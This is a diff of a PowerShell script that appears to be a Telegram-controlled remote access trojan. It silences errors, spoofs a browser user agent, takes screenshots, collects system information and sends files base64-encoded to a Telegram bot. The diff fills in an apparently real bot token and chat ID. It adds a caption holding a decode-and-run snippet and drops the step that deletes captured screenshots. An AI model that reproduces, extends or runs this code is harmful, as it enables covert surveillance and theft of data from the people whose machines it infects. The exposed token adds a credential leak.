@@ -1,6 +1,6 @@
 # Define your bot token and chat ID
-$botToken = ""
-$chatId = ""
+$botToken = "6976425821:AAErUZXHlRlyUR8ip9oXEFl8EeNH7S5Jlq8"
+$chatId = "5280118795"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $ErrorActionPreference = 'silentlycontinue'
 $UAG = 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
@@ -33,14 +33,14 @@ function Download-TelegramFiles {
     $fileBase64 = [Convert]::ToBase64String($fileContent)
     $fileName = [System.IO.Path]::GetFileName($filePath)
     $caption = 'Decode Base64 For Read
-
+```
 $username=""
 $base64EncodedData = Get-Content -Path "C:\Users\$username\Downloads\Telegram Desktop\'+ $fileName + '" -Raw
 $outputFilePath = "C:\Users\$username\Downloads\Telegram Desktop\d'+ $fileName + '"
 $fileBytes = [System.Convert]::FromBase64String($base64EncodedData)
 [System.IO.File]::WriteAllBytes($outputFilePath, $fileBytes)
 &$outputFilePath
-
+```
     '
     $boundary = [System.Guid]::NewGuid().ToString()
     $lf = "`r`n"
@@ -60,7 +60,10 @@ $fileBytes = [System.Convert]::FromBase64String($base64EncodedData)
     $bodyLines += "Content-Disposition: form-data; name=`"caption`""
     $bodyLines += ""
     $bodyLines += "$caption"
-    $bodyLines += "--$boundary--"
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"parse_mode`""
+    $bodyLines += ""
+    $bodyLines += "Markdown"  # Specify the parse_mode value here, e.g., Markdown or HTML
     $bodyLines += "--$boundary--"
     $body = $bodyLines -join $lf
     $response = Invoke-RestMethod -Uri $apiUrl -Method Post -UserAgent $UAG -Headers $headers -Body $body | Out-String 
@@ -192,7 +195,6 @@ while ($true) {
                     $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)
 
                     Download-TelegramFiles -filePath "C:\temp\screenshot.png"
-                    Remove-Item -Path C:\temp\screenshot.png -Force
                 }
 
                 "Systeminfo" {
